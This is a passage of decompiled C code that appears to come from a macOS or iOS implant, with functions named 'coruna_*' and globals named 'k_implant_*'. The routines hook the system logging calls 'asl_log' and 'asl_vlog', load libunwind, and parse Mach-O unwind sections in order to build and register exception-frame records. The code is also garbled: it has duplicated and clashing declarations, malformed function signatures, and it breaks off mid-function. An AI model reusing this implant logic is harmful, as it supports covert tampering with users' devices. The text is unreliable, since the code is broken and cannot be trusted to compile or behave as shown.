                    (lm2,1,(natural_t *)&bootargs,serial_buf,(mach_msg_type_number_t *)&host_info)
  ;
  if (u != 0) {
    u = u | 0x80000000;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  ln1 = (natural_t)bootargs;
  if ((natural_t)bootargs == 0) {
    port = 0;
    u = 0xad014;
  }
  else {
    u = 0;
    port = serial_buf[0][1] & 0xffffff;
  }
  _vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,(vm_address_t)serial_buf[0],
                 (host_info & 0xffffffff) << 2);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
  return u;
  }
  ___stack_chk_fail();
}





uint64_t
uint64_t coruna_vasprintf(uint64_t val,uint64_t id_2,int flags,char *path,va_list arg)
{
  int err;
  uint64_t u;
  char *scratch;
  uint64_t bootargs;
  char thread_attr;
  uint32_t scratch;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  scratch = (char *)0x0;
  err = _vasprintf(&scratch,path,arg);
  if (err == -1 || scratch == (char *)0x0) {
    u = 0xffffffff;
  }
  else {
    if (k_implant_rodata_word_2c098 == '\0' || (k_implant_rodata_word_2c09a & 1) == 0) {
      u = 0xffffffff;
    }
    else {
      bootargs = (uint64_t)0;
      _cStack_31 = coruna_cat(0x737d,SUB81(0,7));
      err = (uint)(flags == 7) << 1;
      if (flags == 6) {
        err = 1;
      }
      (*k_implant_rodata_word_2c0a8)(k_implant_rodata_word_2c0a0,k_implant_rodata_word_2c0b0,err,&bootargs);
      u = 0;
    }
    _free(scratch);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_is_asl_symbol(char *path,uint64_t *val)
{
  int err;
  uint64_t u;
  void (*ptr)(void);
  
  if (path == (char *)0x0) {
    return 0;
  }
  if (val == (uint64_t *)0x0) {
    return 0;
  }
  if (k_implant_rodata_word_2c098 == '\0' || (k_implant_rodata_word_2c09a & 1) == 0) {
fail:
    u = 0;
  }
  else {
    err = _strcmp(path,"_asl_vlog");
    ptr = coruna_vasprintf;
    if (err != 0) {
      err = _strcmp(path,"_asl_log");
      ptr = coruna_asl_log;
      if (err != 0) goto fail;
    }
    *val = ptr;
    u = 1;
  }
  return u;
}





void coruna_asl_log(void)
{
  coruna_vasprintf();
  return;
}





bool coruna_init_os_log(void)
{
  char err;
  int err;
  long handle;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_2c0b8);
  if (err != 0) {
    return false;
  }
  err = k_implant_rodata_word_2c099;
  _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_2c0b8);
  return err != '\0';
}





uint64_t coruna_strnlen_wire(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if ((*(ushort *)(handle + 0x1c0) & 0x18) == 0) {
    u = 0;
  }
  else {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a78;
    thread_attr = coruna_macho_unwind_info;
    host_info = &k_implant_rodata_word_28a98;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_macho_unwind_info(long handle,long addr_2)
{
  char *ptr;
  long *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  char *buf;
  long addr;
  void *scratch;
  long bootargs;
  void *thread_attr;
  uint64_t host_info;
  
  ptr = (char *)(addr_2 + 0x48);
  buf = ptr + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (buf <= ptr) {
      return 0;
    }
    err = _strncmp(ptr,"__eh_frame",0xb);
    if (err == 0) {
      u = coruna_vec_push_pair(*(long *)(handle + 0x20) + 0xe8,*(long *)(handle + 0x20) + 0xf0);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(handle + 0x20);
      if (*(long *)(handle + 0xe8) == 0) {
        return 0xad001;
      }
      size = *(unsigned long *)(ptr + 0x28);
      if (4 < size >> 0x15) {
        return 0xad014;
      }
      ptr = (long *)(*(long *)(handle + 0xe8) + (unsigned long)(*(int *)(handle + 0xf0) - 1) * 0x10);
      *ptr = *(long *)(ptr + 0x20) + *(long *)(handle + 0x18);
      *(int *)(ptr + 1) = (int)size;
      *(uint8_t *)((long)ptr + 0xc) = 0;
      handle = *(long *)(handle + 0x20);
fail:
      *(uint8_t *)(handle + 0xfd) = 1;
    }
    else {
      err = _strncmp(ptr,"__unwind_info",0xe);
      if (err == 0) {
        addr = *(long *)(handle + 0x20);
        host_info = 0;
        scratch = (void *)0x0;
        handle = *(long *)(ptr + 0x20) + *(long *)(addr + 0x18);
        u = coruna_bind_foreach(handle,coruna_reallocf,&scratch);
        if ((int)u != 0) {
          return u;
        }
        thread_attr = scratch;
        bootargs = addr;
        u = coruna_bind_foreach(handle,coruna_bzero_5,&bootargs);
        _free(scratch);
        if ((int)u != 0) {
          return u;
        }
        handle = *(long *)(handle + 0x20);
        if (*(int *)(handle + 0xf0) != 0) goto fail;
      }
    }
    ptr = ptr + 0x50;
  } while( true );
}





uint64_t coruna_vec_push_pair(uint64_t *val,uint *size)
{
  uint64_t *ptr;
  uint u;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((size != (uint *)0x0) && (val != (uint64_t *)0x0)) {
    u = *size;
    ptr = _realloc((void *)*val,(unsigned long)(u + 1) << 4);
    if (ptr == (void *)0x0) {
      size = 0xad009;
    }
    else {
      size = 0;
      ptr = (uint64_t *)((long)ptr + (unsigned long)*size * 0x10);
      *ptr = 0;
      ptr[1] = 0;
      *val = ptr;
      *size = u + 1;
    }
  }
  return size;
}
unsigned long coruna_strnlen(long *arg)

{
  int *fde;
  long *ptr;
  uint size;
  uint type_id_8;
  uint version;
  int count;
  uint tag;
  uint64_t kind;
  uint8_t type_id_13;
  uint type_id;
  uint type_id_9;
  long serial_7;
  unsigned long type_id_15;
  size_t ls13;
  byte *entry;
  byte *entry_9;
  void *entry_10;
  void *entry_11;
  int i;
  long serial_8;
  long *entry_12;
  unsigned long type_id_17;
  uint64_t *block;
  long serial_9;
  long serial_10;
  unsigned long type_id_18;
  long serial_11;
  byte *entry_13;
  uint *entry;
  unsigned long type_id_19;
  unsigned long type_id_20;
  long serial_12;
  byte *entry_14;
  byte *entry_15;
  char *entry_10;
  long *entry_16;
  int *count;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_55;
  uint64_t region;
  long cache_57;
  uint64_t cache_58;
  char *cache_59;
  uint64_t plist;
  uint64_t url_buf;
  unsigned long sa_new [2];
  uint64_t json_buf;
  uint64_t *region;
  uint64_t plist;
  long url_buf;
  uint32_t frame;
  uint scratch;
  uint cache_60;
  uint64_t bootargs[2];
  
  if (arg == (long *)0x0) {
    type_id_15 = 0xad001;
  }
  else if (*(char *)((long)arg + 0xfd) == '\0') {
    type_id_15 = 0;
  }
  else {
    serial_7 = *arg;
    if ((*(int *)(serial_7 + 0x118) != 1) ||
       (type_id_15 = coruna_macho_data_seg(serial_7,*(uint64_t *)(serial_7 + 0x110),serial_7 + 0x120),
       (int)type_id_15 == 0)) {
      serial_7 = k_implant_rodata_word_1e8d8;
      serial_8 = arg[0x1d];
      type_id_15 = 0xad00f;
      if ((serial_8 != 0) && ((int)arg[0x1e] != 0)) {
        type_id_15 = 0;
        type_id_20 = 0;
        do {
          type_id = 0xad00f;
          if ((serial_8 != 0) && (serial_10 = *(long *)(serial_8 + type_id_15 * 0x10), serial_10 != 0)) {
            version = *(uint *)(serial_8 + type_id_15 * 0x10 + 8);
            if (version == 0) {
              type_id = 0xad00f;
            }
            else {
              type_id_18 = 0;
              do {
                int frame_done = 0;
                while( true ) {
                  fde = (int *)(serial_10 + type_id_18);
                  count = *fde;
                  if (fde[1] != 0) break;
                  type_id = (int)type_id_18 + count + 4;
                  type_id_18 = (unsigned long)type_id;
                  if (version <= type_id) {
                    frame_done = 1;
                    break;
                  }
                }
                if (frame_done) {
                  type_id = 0;
                  *(uint8_t *)(arg + 0x22) = 1;
                  *(uint8_t *)(arg + 0x26) = 1;
                  break;
                }
                url_buf = 0;
                json_buf = 0;
                sa_new[1] = 0;
                plist = 0;
                region = (uint64_t *)0x0;
                plist = 0;
                sa_new[0] = 0;
                url_buf = 0;
                region = 0;
                cache_55 = 0;
                cache_57 = 0;
                sa_new = 0;
                tmp_buf = 0;
                path_buf = 0;
                type_id = 0xad001;
                break;
              } while (type_id < version);
            }
          }
switchD_0001494c_caseD_4d:
          if ((uint)type_id_20 != 0) {
            type_id = (uint)type_id_20;
          }
          type_id_20 = (unsigned long)type_id;
          type_id_15 = type_id_15 + 1;
          if (*(uint *)(arg + 0x1e) <= type_id_15) {
            return type_id_20;
          }
          serial_8 = arg[0x1d];
        } while( true );
      }
    }
  }
  return type_id_15;
}





uint coruna_munmap(long handle)
{
  int *fde;
  long *ptr;
  uint u;
  int err;
  uint size;
  uint version;
  uint64_t *ptr;
  long *buf;
  long handle;
  void *str;
  void *copy;
  unsigned long port;
  long addr;
  void *data;
  uint tag;
  unsigned long kind;
  long off;
  
  if (handle == 0) {
    return 0xad001;
  }
  if (*(char *)(handle + 0xfd) == '\0') {
    return 0;
  }
  addr = *(long *)(handle + 0xe8);
  if (addr == 0) {
    return 0xad00f;
  }
  if (*(int *)(handle + 0xf0) == 0) {
    return 0xad00f;
  }
  port = 0;
  version = 0;
  do {
    ptr = (long *)(addr + port * 0x10);
    off = *ptr;
    size = *(uint *)(ptr + 1);
    tag = 0xad001;
    if (off != 0 && size != 0) {
      kind = 0;
      do {
        fde = (int *)(off + kind);
        err = *fde;
        if (fde[1] != 0) {
          if (fde == (int *)0x0) {
            tag = 0xad001;
            break;
          }
          ___deregister_frame(fde);
        }
        tag = (int)kind + err + 4;
        kind = (unsigned long)tag;
      } while (tag < size);
      tag = 0;
    }
done:
    if (*(char *)(addr + port * 0x10 + 0xc) != '\0') {
      _bzero((void *)*ptr,(unsigned long)*(uint *)(ptr + 1));
      _munmap(*ptr,0x4000);
      *ptr = 0;
      ptr[1] = 0;
    }
    while( true ) {
      if (version != 0) {
        tag = version;
      }
      port = port + 1;
      if (*(uint *)(handle + 0xf0) <= port) {
        _bzero(*(void **)(handle + 0xe8),(unsigned long)*(uint *)(handle + 0xf0) << 4);
        _free(*(void **)(handle + 0xe8));
        *(uint64_t *)(handle + 0xe8) = 0;
        *(uint32_t *)(handle + 0xf0) = 0;
        if (k_implant_rodata_word_24ca0 == (void *)0x0) {
          return tag;
        }
        version = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_24610);
        if (version != 0) {
          tag = -version;
          if (-1 < (int)version) {
            tag = version;
          }
          return tag | 0x40000000;
        }
        copy = k_implant_rodata_word_24ca0;
        if (k_implant_rodata_word_24ca0 != (void *)0x0) goto cleanup;
        _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
        return tag;
      }
      addr = *(long *)(handle + 0xe8);
      version = tag;
      if (addr != 0) break;
fail:
      tag = 0xad00f;
    }
  } while( true );
cleanup:
  addr = k_implant_rodata_word_24ca8;
  data = *(void **)((long)copy + 0x28);
  if (*(long *)((long)copy + 8) == *(long *)(handle + 0x100)) {
    if (k_implant_rodata_word_24ca8 != 0) {
      err = *(int *)((long)copy + 0x14) + -0x61c88647;
      version = ((uint)*(byte *)((long)copy + 0x13) * 0x1000000 - err) +
              (uint)*(byte *)((long)copy + 0x12) * 0x10000 +
              (uint)*(byte *)((long)copy + 0x11) * 0x100 + (uint)*(byte *)((long)copy + 0x10)
              + 0x9f49bac2 ^ 0x7f76d;
      size = (err - version) + 0x1124109 ^ version << 8;
      u = 0xfeedbef7 - (version + size) ^ size >> 0xd;
      version = version - (size + u) ^ u >> 0xc;
      size = size - (u + version) ^ version << 0x10;
      u = u - (version + size) ^ size >> 5;
      version = version - (size + u) ^ u >> 3;
      size = size - (u + version) ^ version << 10;
      version = u - (version + size) ^ size >> 0xf;
      ptr = *(uint64_t **)(k_implant_rodata_word_24ca8 + 0x10);
      off = *(long *)((long)*ptr + (unsigned long)(*(int *)(ptr + 1) - 1U & version) * 0x10);
      if (off != 0) {
        handle = ptr[4];
        do {
          str = (void *)(off - handle);
          if (((*(uint *)((long)str + 0x44) == version) && (*(int *)((long)str + 0x40) == 8)) &&
             (**(long **)((long)str + 0x38) == *(long *)((long)copy + 0x10))) {
            off = *(long *)((long)str + 0x18);
            if ((off == 0) && (*(long *)((long)str + 0x20) == 0)) {
              _free((void *)*ptr);
              _free(*(void **)(addr + 0x10));
              k_implant_rodata_word_24ca8 = 0;
            }
            else {
              if (ptr[3] == (long)str + 0x10) {
                ptr[3] = off + handle;
              }
              if (off == 0) {
                addr = *(long *)((long)str + 0x20);
                k_implant_rodata_word_24ca8 = addr;
              }
              else {
                *(uint64_t *)(off + handle + 0x10) = *(uint64_t *)((long)str + 0x20);
                addr = *(long *)((long)str + 0x20);
              }
              if (addr != 0) {
                *(long *)(addr + *(long *)(*(long *)(k_implant_rodata_word_24ca8 + 0x10) + 0x20) + 8) = off;
              }
              buf = *(long **)(k_implant_rodata_word_24ca8 + 0x10);
              ptr = (long *)(*buf + (unsigned long)((int)buf[1] - 1U & version) * 0x10);
              *(int *)(ptr + 1) = (int)ptr[1] + -1;
              if (*ptr == (long)str + 0x10) {
                *ptr = *(long *)((long)str + 0x30);
              }
              addr = *(long *)((long)str + 0x28);
              if (addr != 0) {
                *(uint64_t *)(addr + 0x20) = *(uint64_t *)((long)str + 0x30);
              }
              if (*(long *)((long)str + 0x30) != 0) {
                *(long *)(*(long *)((long)str + 0x30) + 0x18) = addr;
              }
              *(int *)(buf + 2) = (int)buf[2] + -1;
            }
            _free(str);
            break;
          }
          off = *(long *)((long)str + 0x30);
        } while (off != 0);
      }
    }
    str = k_implant_rodata_word_24ca0;
    addr = *(long *)((long)copy + 0x20);
    if ((addr == 0) && (*(long *)((long)copy + 0x28) == 0)) {
      _free((void *)**(uint64_t **)((long)k_implant_rodata_word_24ca0 + 0x18));
      _free(*(void **)((long)str + 0x18));
      k_implant_rodata_word_24ca0 = (void *)0x0;
    }
    else {
      off = *(long *)((long)k_implant_rodata_word_24ca0 + 0x18);
      if ((long)copy + 0x18 == *(long *)(off + 0x18)) {
        *(long *)(off + 0x18) = addr + *(long *)(off + 0x20);
        if (addr != 0) goto skip;
next:
        str = *(void **)((long)copy + 0x28);
        k_implant_rodata_word_24ca0 = str;
      }
      else {
        if (addr == 0) goto next;
skip:
        *(uint64_t *)(addr + *(long *)(off + 0x20) + 0x10) =
             *(uint64_t *)((long)copy + 0x28);
        str = *(void **)((long)copy + 0x28);
      }
      if (str != (void *)0x0) {
        *(long *)((long)str + *(long *)(*(long *)((long)k_implant_rodata_word_24ca0 + 0x18) + 0x20) + 8) =
             addr;
      }
      buf = *(long **)((long)k_implant_rodata_word_24ca0 + 0x18);
      ptr = (long *)(*buf +
                       (unsigned long)((int)buf[1] - 1U & *(uint *)((long)copy + 0x4c)) * 0x10);
      *(int *)(ptr + 1) = (int)ptr[1] + -1;
      if (*ptr == (long)copy + 0x18) {
        *ptr = *(long *)((long)copy + 0x38);
      }
      addr = *(long *)((long)copy + 0x30);
      if (addr != 0) {
        *(uint64_t *)(addr + 0x20) = *(uint64_t *)((long)copy + 0x38);
      }
      if (*(long *)((long)copy + 0x38) != 0) {
        *(long *)(*(long *)((long)copy + 0x38) + 0x18) = addr;
      }
      *(int *)(buf + 2) = (int)buf[2] + -1;
    }
    _free(copy);
  }
  copy = data;
  if (data == (void *)0x0) {
check_ok:
    _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
    return tag;
  }
  goto cleanup;
}





uint64_t coruna_init_libunwind(long handle)
{
  long handle;
  int err;
  int *err;
  uint64_t u;
  unsigned long size;
  uint64_t scratch;
  long bootargs;
  
  u = 0xad001;
  if (handle != 0) {
    handle = _dlopen("/usr/lib/system/libunwind.dylib",2);
    if (handle == 0) {
      u = 0x18004;
    }
    else {
      bootargs = 0;
      u = coruna_find_libunwind_image(&bootargs);
      if (((int)u == 0) && (u = 0xad001, bootargs != 0)) {
        err = *(int *)(bootargs + 0x10);
        if (err != 0) {
          err = (int *)(bootargs + 0x20);
          do {
            if (*err == 0x2a) {
              size = *(unsigned long *)(err + 2);
              if (0x1869f0000000000 < size) {
                u = 0x18008;
                goto fail;
              }
              scratch = 0;
              u = coruna_implant_via_ctx_free_2(handle,bootargs,0,0x10,&scratch);
              if ((int)u != 0) goto fail;
              if (size - 0xca1900000000 < 0x5760300000000) {
                *(uint32_t *)(handle + 0x118) = 1;
                u = coruna_pthread_mutex_init(handle,handle + 0x120);
                if ((int)u != 0) {
                  coruna_ctx_free(scratch);
                  goto fail;
                }
              }
              else {
                *(uint32_t *)(handle + 0x118) = 0;
              }
              *(long *)(handle + 0x100) = handle;
              *(unsigned long *)(handle + 0x108) = size;
              *(long *)(handle + 0x110) = bootargs;
              return 0;
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            err = err + -1;
          } while (err != 0);
        }
        u = 0xad011;
      }
fail:
      _dlclose(handle);
    }
  }
  return u;
}





uint64_t coruna_bind_foreach(int *flags,void (*val,uint64_t val)
{
  int *err;
  uint u;
  uint size;
  unsigned long version;
  uint32_t *ptr;
  int *status;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  
  port = 0xad001;
  if ((flags != (int *)0x0) && (arg != (void (*)0x0)) {
    if ((((unsigned long)flags & 3) == 0) && (*flags == 1)) {
      tag = 0;
      do {
        if ((uint)flags[6] <= tag) {
          return 0;
        }
        status = (int *)((long)flags + tag * 0xc + (unsigned long)(uint)flags[5]);
        if (status == (int *)0x0) {
          return 0xad001;
        }
        if (((unsigned long)status & 3) != 0) goto fail;
        version = (unsigned long)(uint)status[1];
        if (status[1] == 0) {
          port = (*arg)(*status,0,0,0,1,val);
        }
        else {
          err = (int *)((long)flags + version);
          if (*err == 3) {
            if (err == (int *)0x0) {
              return 0xad001;
            }
            if (((unsigned long)err & 3) != 0) goto fail;
            kind = 0;
            while (kind < *(ushort *)((long)err + 6)) {
              u = *(uint *)((long)flags + kind * 4 + *(ushort *)(err + 1) + version);
              size = u >> 0x18;
              if (size < (uint)flags[2]) {
                ptr = (uint32_t *)((long)flags + (unsigned long)size * 4 + (unsigned long)(uint)flags[1]);
              }
              else {
                ptr = (uint32_t *)
                         ((long)err +
                         (unsigned long)(size - flags[2]) * 4 + (unsigned long)*(ushort *)(err + 2));
              }
              port = coruna_implant_residual_63(flags,status,(u & 0xffffff) + *status,*ptr,arg,
                                   val);
              kind = kind + 1;
              if ((int)port != 0) {
                return port;
              }
            }
          }
          else {
            if (*err != 2) goto fail;
            if (err == (int *)0x0) {
              return 0xad001;
            }
            if (((unsigned long)err & 3) != 0) goto fail;
            kind = 0xffffffffffffffff;
            while (kind = kind + 1, kind < *(ushort *)((long)err + 6)) {
              if (((int)flags + (int)version + (uint)*(ushort *)(err + 1) & 3) != 0)
              goto fail;
              ptr = (uint32_t *)((long)flags + version + *(ushort *)(err + 1));
              port = coruna_implant_residual_63(flags,status,*ptr,ptr[1],arg,val);
              version = version + 8;
              if ((int)port != 0) {
                return port;
              }
            }
          }
          port = 0;
        }
        tag = tag + 1;
      } while ((int)port == 0);
    }
    else {
fail:
      port = 0xad014;
    }
  }
  return port;
}





uint64_t coruna_reallocf(int flags)
{
  long handle;
  uint64_t u;
  uint32_t *ptr;
  void *ptr;
  uint64_t *in_x5;
  long addr;
  
  u = 0xad001;
  if ((flags != 0) && (in_x5 != (uint64_t *)0x0)) {
    ptr = (uint32_t *)*in_x5;
    if (ptr == (uint32_t *)0x0) {
      ptr = _malloc(4);
      *in_x5 = ptr;
      if (ptr == (uint32_t *)0x0) {
        return 0xad009;
      }
      *ptr = 0;
    }
    handle = 0;
    do {
      addr = handle;
      handle = addr + 4;
    } while (*(int *)((long)ptr + addr) != 0);
    ptr = _reallocf(ptr,addr + 8);
    *in_x5 = ptr;
    u = 0xad009;
    if (ptr != (void *)0x0) {
      u = 0;
      ptr = (uint32_t *)((long)ptr + addr + 4);
      ptr[-1] = flags;
      *ptr = 0;
    }
  }
  return u;
}





void coruna_bzero_5(uint size,uint flags_2,uint count_3,uint version_4,uint version_5,long *handle)
{
  uint u;
  bool err;
  bool status;
  bool flags;
  void *ptr;
  uint32_t size;
  uint version;
  unsigned long port;
  unsigned long tag;
  long *buf;
  long handle;
  uint kind;
  uint type_id;
  uint type_id_8;
  char err;
  uint type_id_9;
  uint32_t *ptr;
  uint *buf;
  uint scratch;
  uint8_t bootargs[3];
  uint8_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t serial_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  long action;
  uint *str;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  tmp_buf = 0;
  serial_buf = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  host_info = 0;
  path_buf = 0;
  sa_new = 0;
  action = 0;
  serial_buf = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  _local_b0 = 0;
  host_info = 0;
  thread_attr = 0;
  if (((((((version_5 != 0) || (size == 0)) || (flags_2 == 0)) ||
        ((handle == (long *)0x0 || (*handle == 0)))) ||
       ((handle[1] == 0 ||
        (((int)version_4 < 0 || (port = *(unsigned long *)(*handle + 0x10), port <= size)))))) ||
      (port <= count_3)) || (port <= version_4)) {
    type_id_8 = 0;
    if (flags_2 != 0) {
      type_id_8 = 0xad001;
    }
    kind = 0;
    if ((version_5 & 1) == 0) {
      kind = type_id_8;
    }
    port = (unsigned long)kind;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(port);
  }
  _local_b0 = 0;
  bootargs = 0;
  thread_attr = 1;
  if (count_3 == 0 && version_4 == 0) {
    thread_attr = 0x527a01;
    port = 0xc;
  }
  else if ((count_3 == 0) && (version_4 != 0)) {
    size = 0x52507a;
    thread_attr = (unsigned long)coruna_cat(size,1);
    port = 0xd;
  }
  else if ((count_3 == 0) || (version_4 != 0)) {
    *(uint8_t *)((uint32_t *)((unsigned long)bootargs | 9) + 1) = 0;
    *(uint32_t *)((unsigned long)bootargs | 9) = 0x524c507a;
    port = 0xe;
  }
  else {
    size = 0x524c7a;
    thread_attr = (unsigned long)coruna_cat(size,1);
    port = 0xd;
  }
  *(uint32_t *)((unsigned long)bootargs | port) = 0x1e7801;
  type_id_8 = (int)port + 3;
  if (version_4 == 0) {
    tag = 1;
  }
  else {
    bootargs[(unsigned long)type_id_8 + 1] = 0x84;
    *(unsigned long *)(bootargs + (unsigned long)type_id_8 + 2) = *(long *)(*handle + 0x100) + (unsigned long)version_4;
    tag = 10;
  }
  if (count_3 != 0) {
    bootargs[tag + type_id_8] = 4;
    tag = (unsigned long)((int)tag + 1);
  }
  bootargs[tag + type_id_8] = 4;
  kind = 0xad001;
  scratch = type_id_8;
  if (type_id_8 < 0x80) {
    kind = 0;
    bootargs[type_id_8] = (char)tag;
    scratch = (int)port + 4;
  }
  scratch = scratch + (int)tag;
  port = (unsigned long)scratch;
  u = flags_2 & 0xf000000;
  if (u == 0x4000000 || u == 0x2000000) {
    if (scratch < 0x7e) {
      err = false;
      type_id_9 = 0;
      bootargs[(unsigned long)scratch + 2] = 0;
      *(uint16_t *)(bootargs + scratch) = 0x1f0c;
      scratch = scratch + 3;
      port = (unsigned long)scratch;
    }
    else {
      err = false;
      type_id_9 = 0xad00c;
    }
  }
  else if (u == 0x3000000) {
    type_id_9 = 0;
    err = true;
  }
  else {
    err = false;
    type_id_9 = 0xad014;
  }
  version = (uint)port;
  if (0x7f < type_id_8) {
    type_id_9 = kind;
  }
  ptr = (uint32_t *)(bootargs + port);
  if (ptr < (uint32_t *)((unsigned long)(bootargs + port + 7) & 0xfffffffffffffff8)) {
    port = (unsigned long)scratch;
    do {
      *(uint8_t *)ptr = 0;
      version = (int)port + 1;
      port = (unsigned long)version;
      ptr = (uint32_t *)(bootargs + port);
      scratch = version;
    } while (ptr < (uint32_t *)((unsigned long)(bootargs + port + 7) & 0xfffffffffffffff8));
  }
  _local_b0 = coruna_u64_pack((bootargs), (version - 4));
  *ptr = 0;
  *(uint *)(bootargs + (scratch + 4)) = scratch + 4;
  buf = (uint *)handle[1];
  port = *(long *)(*handle + 0x100) + (unsigned long)size;
  *(unsigned long *)(bootargs + (scratch + 8)) = port;
  do {
    str = buf + 1;
    type_id_8 = *buf;
    buf = str;
  } while (type_id_8 != 0 && type_id_8 != size);
  if (((type_id_8 == 0) ||
      (type_id_8 = *str, kind = type_id_8 - size, tag = (unsigned long)kind, type_id = type_id_9,
      type_id_8 < size || kind == 0)) && (tag = port, type_id = 0xad014, type_id_9 != 0)) {
    type_id = type_id_9;
  }
  *(unsigned long *)(bootargs + (scratch + 0x10)) = tag;
  type_id_8 = scratch + 0x18;
  if (count_3 == 0) {
    if (type_id_8 < 0x80) {
      kind = 0;
      bootargs[type_id_8] = 0;
      type_id_8 = scratch + 0x19;
    }
    else {
      kind = 0xad001;
    }
    scratch = type_id_8;
    if (type_id != 0) {
      kind = type_id;
    }
  }
  else {
    if (type_id_8 < 0x80) {
      kind = 0;
      bootargs[type_id_8] = 8;
      type_id_8 = scratch + 0x19;
    }
    else {
      kind = 0xad001;
    }
    if (type_id != 0) {
      kind = type_id;
    }
    *(unsigned long *)(bootargs + type_id_8) = *(long *)(*handle + 0x100) + (unsigned long)count_3;
    scratch = type_id_8 + 8;
  }
  if (u == 0x2000000) {
    bootargs[scratch] = 0xe;
    type_id_8 = scratch + 1;
    if (type_id_8 < 0x80) {
      type_id_9 = flags_2 >> 8 & 0xfff0;
      port = (unsigned long)type_id_9;
      type_id = flags_2 >> 8 & 0x70;
      tag = (unsigned long)type_id;
      bootargs[type_id_8] = (char)type_id;
      scratch = scratch + 2;
      status = 0x7f < type_id_9;
      if ((status) && (type_id_8 = scratch, scratch != 0x80)) {
        do {
          bootargs[type_id_8 - 1] = (byte)tag | 0x80;
          tag = port >> 7 & 0x7f;
          bootargs[type_id_8] = (char)tag;
          scratch = type_id_8 + 1;
          status = 0x3fff < port;
          if (!status) break;
          port = port >> 7;
          flags = type_id_8 != 0x7f;
          type_id_8 = scratch;
        } while (flags);
      }
      type_id_8 = 0;
      if (status) {
        type_id_8 = 0xad00c;
      }
      err = '\x01';
    }
    else {
      scratch = type_id_8;
      type_id_8 = 0xad001;
    }
  }
  if (u == 0x4000000) {
    if (scratch < 0x7a) {
      *(uint32_t *)(bootargs + (unsigned long)scratch + 3) = 0x29d019e;
      *(uint32_t *)(bootargs + scratch) = 0x9e101d0c;
      scratch = scratch + 7;
      err = '\x03';
    }
    else {
      type_id_8 = 0xad00c;
    }
  }
  if (((u == 0x2000000) && (type_id_8 == 0) && (err == '\x01')) ||
     ((u == 0x4000000) && (type_id_8 != 0xad00c) && (err == '\x03'))) {
next:
      if ((flags_2 & 1) == 0) {
retry:
        if ((flags_2 >> 1 & 1) == 0) {
found:
          if ((flags_2 >> 2 & 1) == 0) {
nomem:
            if ((flags_2 >> 3 & 1) == 0) {
invalid:
              if ((flags_2 >> 4 & 1) == 0) {
                if ((flags_2 >> 8 & 1) == 0) {
again:
                  if ((flags_2 >> 9 & 1) == 0) {
exit_ok:
                    if ((flags_2 >> 10 & 1) == 0) {
joined_r0x00016860:
                      if ((flags_2 >> 0xb & 1) == 0) {
                        type_id_8 = 0;
                        u = 0;
                        if (type_id_8 != 0xad005) {
                        u = type_id_8;
                        }
                        if (kind != 0) {
                        u = kind;
                        }
                        port = (unsigned long)u;
                        *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
                        if (*(long *)k_implant_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                      }
                      bootargs[scratch] = 0xce;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xcf;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          type_id_8 = 0;
                          u = 0;
                          if (type_id_8 != 0xad005) {
                          u = type_id_8;
                          }
                          if (kind != 0) {
                          u = kind;
                          }
                          port = (unsigned long)u;
                          *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
                          if (*(long *)k_implant_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                        }
                      }
                    }
                    else {
                      bootargs[scratch] = 0xcc;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xcd;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          err = err + '\x02';
                          goto joined_r0x00016860;
                        }
                      }
                    }
                  }
                  else {
                    bootargs[scratch] = 0xca;
                    type_id_8 = scratch + 1;
                    if (type_id_8 < scratch + 2) {
                      bootargs[type_id_8] = err;
                      bootargs[scratch + 2] = 0xcb;
